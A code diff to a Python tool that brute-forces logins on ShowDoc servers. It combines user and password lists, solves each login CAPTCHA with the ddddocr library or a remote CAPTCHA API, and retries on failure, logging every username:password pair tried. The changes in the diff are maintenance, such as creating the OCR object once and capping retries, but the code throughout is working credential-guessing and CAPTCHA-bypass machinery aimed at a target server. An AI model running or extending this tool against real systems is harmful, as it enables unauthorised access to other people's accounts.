@@ -11,6 +11,8 @@ from colorama import Fore, init
 urllib3.disable_warnings()
 init()
 
+ocr = ddddocr.DdddOcr(show_ad=False)
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-t', type=str, help="showdoc地址(例如：http://showdoc.demo.com/)", default="")
@@ -105,7 +107,6 @@ def showdoc_captcha_code(captcha_api, captcha_b64):
 
 
 def showdoc_captcha_code_local(captcha_b64):
-    ocr = ddddocr.DdddOcr()
     try:
         img_bytes = base64.b64decode(captcha_b64)
         captcha_code = ocr.classification(img_bytes)[0:10]
@@ -143,7 +144,7 @@ def showdoc_login_main(showdoc_url, username, password, captcha_api_url):
     exit_num_2 = 0
     while True:
         captcha_id = showdoc_captcha_id(showdoc_url)
-        if captcha_id == 'request error':
+        if captcha_id == 'request error' and exit_num != 5:
             print(Fore.RED + '\n[-] 验证码id获取失败!')
             logger(filename='error.log', io_type='a', string=f'[{showdoc_url}/][{int(time.time())}] captcha id error!{username}:{password}\n')
             exit_num = exit_num + 1
@@ -155,7 +156,7 @@ def showdoc_login_main(showdoc_url, username, password, captcha_api_url):
     while True:
         while True:
             captcha_base64 = showdoc_captcha_base64(showdoc_url, captcha_id)
-            if captcha_base64 == 'request error':
+            if captcha_base64 == 'request error' and exit_num != 5:
                 print(Fore.RED + '\n[-] 验证码图片获取失败!')
                 logger(filename='error.log', io_type='a', string=f'[{showdoc_url}/][{int(time.time())}] captcha base64 error!{username}:{password}\n')
                 exit_num = exit_num + 1
@@ -169,7 +170,7 @@ def showdoc_login_main(showdoc_url, username, password, captcha_api_url):
                 captcha_code = showdoc_captcha_code_local(captcha_base64)
             else:
                 captcha_code = showdoc_captcha_code(captcha_api_url, captcha_base64)
-            if captcha_code == 'request error':
+            if captcha_code == 'request error' and exit_num != 5:
                 print(Fore.RED + '\n[-] 验证码解码失败!')
                 logger(filename='error.log', io_type='a', string=f'[{showdoc_url}/][{int(time.time())}] captcha code error!{username}:{password}\n')
                 exit_num = exit_num + 1
@@ -180,9 +181,9 @@ def showdoc_login_main(showdoc_url, username, password, captcha_api_url):
                 break
         print(Fore.WHITE + f'[*] 验证码：{captcha_code}')
         login_res_code, login_res_msg = showdoc_login(showdoc_url, username, password, captcha_id, captcha_code)
-        if login_res_msg == '\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e':
+        if login_res_msg == '\u9a8c\u8bc1\u7801\u4e0d\u6b63\u786e' and exit_num_2 != 10:
             exit_num_2 = exit_num_2 + 1
-        elif login_res_msg == 'request error':
+        elif login_res_msg == 'request error' and exit_num_2 != 10:
             exit_num_2 = exit_num_2 + 1
         elif exit_num_2 == 10:
             return '', ''
@@ -198,7 +199,10 @@ def run():
         pass_total = len(pass_list)
         total = user_total * pass_total
         showdoc_url = handle_target(target=args.t)
-        captcha_api_url = handle_target(target=args.c)
+        if args.c != '':
+            captcha_api_url = handle_target(target=args.c)
+        else:
+            captcha_api_url = ''
         print(Fore.WHITE + f'[+] 读取到用户总数：', end='')
         print(Fore.GREEN + f'{user_total}')
         print(Fore.WHITE + f'[+] 读取到密码总数：', end='')
